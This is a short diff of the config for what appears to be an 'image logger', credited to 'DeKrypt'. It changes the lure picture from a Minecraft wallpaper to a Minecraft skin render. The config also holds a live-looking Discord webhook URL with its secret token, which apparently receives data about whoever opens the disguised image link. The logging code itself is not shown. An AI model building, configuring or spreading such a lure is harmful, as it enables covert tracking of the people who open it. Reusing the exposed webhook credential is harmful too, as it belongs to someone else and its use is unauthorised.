@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1529306508863737868/jsurktACWQ2xdMJTqWc1bC7d_Y-o51JGCNTO_tbMx0JDRdjbNm2K7rXCVXHRVs2psuN1",
-    "image": "https://e0.pxfuel.com/wallpapers/576/998/desktop-wallpaper-transparent-minecraft-png-cute-minecraft-girl-outfits-png-cute-girl-minecraft-skins.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://s.namemc.com/3d/skin/body.png?id=e14f3531f09216fb&model=slim&width=308&height=308", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
